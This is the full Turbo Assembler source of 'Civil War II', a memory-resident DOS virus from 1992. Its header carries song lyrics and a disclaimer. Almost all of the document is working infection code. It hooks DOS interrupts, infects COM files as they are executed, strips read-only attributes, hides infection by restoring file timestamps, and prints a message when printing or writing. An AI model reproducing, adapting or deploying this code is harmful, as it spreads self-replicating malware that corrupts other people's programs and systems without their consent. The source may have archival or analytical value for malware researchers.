;****************************************************************************
;   Civil War II                                      			    *
;                                                			    *
;   Assembled with Tasm 2.5                                		    *
;   (c) 1992 Dark Helmet, The Netherlands                       	    *
;   The author takes no responsibility for any dameged caused by this virus *
;									    *
;****************************************************************************
;									    *
;   Civil War...							    *
;									    *
;   "For all I've seen has change my mind                       	    *
;    But still the wars go on as the years go by                	    *
;    With no love for God or human rights                       	    *
;    'Cause all these dreams are swept aside                    	    *
;    By bloody hands of the hypnotized					    *
;    Who carry the cross of homicide                            	    *
;    And history bears the scars of our civil war"              	    *
;                                                			    *
;****************************************************************************

          	.Radix 16
Civil_War 	Segment
		Model  small
          	Assume cs:Civil_War, ds:Civil_War, es:Civil_War

          	org 100h

len       	equ offset last - begin
virus_len 	equ len / 16d 

dummy:         	db 0e9h, 03h, 00h, 44h, 48h, 00h   	; Jump + infection
		                                  	; marker

begin:         	Call virus                    		; make call to
                		                   	; push IP on stack

virus:         	pop  	bp                  		; get IP from stack.
          	sub  	bp,109h                  	; adjust IP.

restore_host:  	mov  	di,0100h            		; recover beginning
          	lea  	si,ds:[carrier_begin+bp] 	; of carrier program.
          	mov  	cx,06h
          	rep  	movsb

check_resident:	mov	ah,0a0h         	    	; check if virus
         	int	21h                 		; already installed.
         	cmp	ax,0001h
         	je   	end_virus

adjust_memory: 	mov  	ax,cs                  		; start of Memory
          	dec  	ax                  		; Control Block
          	mov  	ds,ax
          	cmp  	byte ptr ds:[0000],5a      	; check if last
                                   			; block
          	jne  	abort                  		; if not last block
                                   			; end
          	mov  	ax,ds:[0003]           		; decrease memory
          	sub  	ax,50		       		; by 1kbyte lenght
          	mov  	ds:0003,ax

install_virus: 	mov  	bx,ax                  		; es point to start
          	mov  	ax,es                  		; virus in memory
          	add  	ax,bx
          	mov  	es,ax
          	mov  	cx,len		         	; cx = lenght virus
          	mov  	ax,ds                  		; restore ds
          	inc  	ax
          	mov  	ds,ax
          	lea  	si,ds:[begin+bp]       		; point to start virus
          	lea  	di,es:0100             		; point to destination
          	rep  	movsb                  		; copy virus in
                                   			; memory
          	mov  	[virus_segment+bp],es         	; store start virus
                                   			; in memory
          	mov     ax,cs                 		; restore es
          	mov  	es,ax

hook_vector:   	cli					; no interups
		mov	ax,3517h
		int	21h
		mov	es,[virus_segment+bp]
		mov	es:[old_17h-6],bx
		mov	es:[old_17h+2-6h],es
		mov	dx,offset new_17h - 6h
		mov	ax,2517h
		int	21h
		
		mov  	ax,3521h			; revector int 21
          	int  	21h
		mov 	ds,[virus_segment+bp]
		mov  	ds:[old_21h-6h],bx
          	mov  	ds:[old_21h+2-6h],es
         	mov  	dx,offset main_virus - 6h
          	mov  	ax,2521h
          	int  	21h
          	sti

abort:         	mov  	ax,cs
         	mov  	ds,ax
          	mov  	es,ax
		xor 	ax,ax

end_virus:     	mov	bx,0100h			; jump to begin
		jmp	bx				; host file

		
;***************************************************************************

main_virus:    	pushf					
		cmp	ah,0a0h				; check virus call
		jne	new_21h				; no virus call
		mov	ax,0001h			; ax = id
		popf					; return id	
		iret
		
new_21h:	push	ds				; save registers
		push	es
		push	di
		push	si
		push	ax
		push	bx
		push	cx
		push	dx

		cmp	ah,40h
		jne	check_05
		cmp	bx,0004h
		jne	check_05
		jmp	message

check_05:	cmp	ah,05h
		jne	check_exec
		jmp	message		

check_exec:	cmp	ax,04b00h			; exec function?
		jne	continu
		mov	cs:[name_seg-6],ds
		mov	cs:[name_off-6],dx
		jmp	chk_com

continu:	pop	dx				; restore registers
		pop	cx
		pop	bx
		pop	ax
		pop	si
		pop	di
		pop	es
		pop	ds
		popf
		jmp	dword ptr cs:[old_21h-6]

chk_com:	cld					; check extension
		mov	di,dx				; for COM
		push	ds
		pop	es
		mov	al,'.'				; search extension
		repne	scasb				; check 'COM"
		cmp	word ptr es:[di],'OC'		; check 'CO'
		jne	continu
		cmp	word ptr es:[di+2],'M'		; check 'M'
		jne	continu
		cmp	word ptr es:[di-3],'DN'		; check if
		je      continu				; COMMAND.COM
		
		call	set_int24h
		call	set_atribuut
				
open_file:	mov	ds,cs:[name_seg-6]
		mov	dx,cs:[name_off-6]
		mov	ax,3D02h			; open file
		call 	do_int21h
		jc	close_file
		push	cs
		pop	ds
		mov	[handle-6],ax
		mov	bx,ax	

		call	get_date	
		
check_infect:	push	cs
		pop	ds
		mov	bx,[handle-6]			; read first 6 bytes
		mov	ah,3fh
		mov	cx,06h
		lea	dx,[carrier_begin-6]
		call	do_int21h
		mov	al, byte ptr [carrier_begin-6]+3 ; check initials
		mov	ah, byte ptr [carrier_begin-6]+4 ; 'D' and 'H'
		cmp	ax,[initials-6]
		je	save_date			 ; if equal already
							 ; infect
		
get_lenght:	mov	ax,4200h			; file pointer begin
		call	move_pointer
		mov	ax,4202h			; file pointer end
		call	move_pointer
		sub	ax,03h				; ax = filelenght
		mov	[lenght_file-6],ax
		
		call	write_jmp
		call	write_virus					

save_date:	push	cs
		pop	ds
		mov	bx,[handle-6]
		mov	dx,[date-6]
		mov	cx,[time-6]
		mov	ax,5701h
		call	do_int21h

close_file:	mov	bx,[handle-6]
		mov	ah,03eh				; close file
		call	do_int21h
		
		mov	dx,cs:[old_24h-6]		; restore int24h
		mov	ds,cs:[old_24h+2-6]
		mov	ax,2524h
		call	do_int21h
		
		jmp	continu		
		
		


new_24h:	mov	al,3
		iret


new_17h:	cli
		pushf
		push	ds
		push	es
		push	di
		push	si
		push	ax
		push	bx
		push	cx
		push	dx
		
		cmp	ah,00h
		jne	continu_17h
		jmp	print_message

continu_17h:	pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	si
		pop	di
		pop	es
		pop	ds
		popf
		sti
		jmp	dword ptr cs:[old_17h-6]

print_message:  mov	ah,09h
		lea	dx,cs:text-6h
		call	do_int21h
		jmp	continu_17h 		

;---------------------------------------------------------------------------
;			PROCEDURES
;---------------------------------------------------------------------------

message:	mov	ah,09h
		lea	dx,cs:text-6h
		call	do_int21h
		jmp	continu



move_pointer:	push	cs
		pop	ds
		mov	bx,[handle-6]
		xor	cx,cx
		xor	dx,dx
		call	do_int21h
		ret

do_int21h:	pushf
		call 	dword ptr cs:[old_21h-6]
		ret

write_jmp:	push	cs
		pop	ds
		mov	ax,4200h
		call	move_pointer
		mov	ah,40h
		mov	cx,01h
		lea	dx,[jump-6]
		call	do_int21h
		mov	ah,40h
		mov	cx,02h
		lea	dx,[lenght_file-6]
		call	do_int21h
		mov	ah,40h
		mov	cx,02h
		lea	dx,[initials-6]
		call	do_int21h
		ret

write_virus:	push	cs
		pop	ds
		mov	ax,4202h
		call	move_pointer
		mov	ah,40
		mov	cx,len
		mov	dx,100
		call	do_int21h
		ret

get_date:	mov	ax,5700h
		call	do_int21h
		push	cs
		pop	ds
		mov	[date-6],dx
		mov	[time-6],cx
		ret

set_int24h:	mov	ax,3524h
		call	do_int21h
		mov	cs:[old_24h-6],bx
		mov	cs:[old_24h+2-6],es
		mov	dx,offset new_24h-6
		push	cs
		pop	ds
		mov	ax,2524h
		call	do_int21h
		ret

set_atribuut:	mov	ax,4300h			; get atribuut
		mov	ds,cs:[name_seg-6]
		mov	dx,cs:[name_off-6]
		call	do_int21h
		and	cl,0feh				; set atribuut
		mov	ax,4301h
		call	do_int21h		
		ret

;---------------------------------------------------------------------------
;				DATA
;---------------------------------------------------------------------------

old_21h        	dw  00h,00h
old_17h		dw  00h,00h
old_24h		dw  00h,00h
carrier_begin  	db  090h, 0cdh, 020h, 044h, 048h, 00h
text      	db  'Civil War II v1.0, (c) 06/03/1992 The Netherlands.','$',00h
jump		db  0e9h
name_seg	dw  ?
name_off	dw  ?
virus_segment  	dw  ?
lenght_file	dw  ?
handle		dw  ?
date		dw  ?
time		dw  ?
initials	dw  4844h
last      	db  090h

Civil_war 	ends
          	end dummy
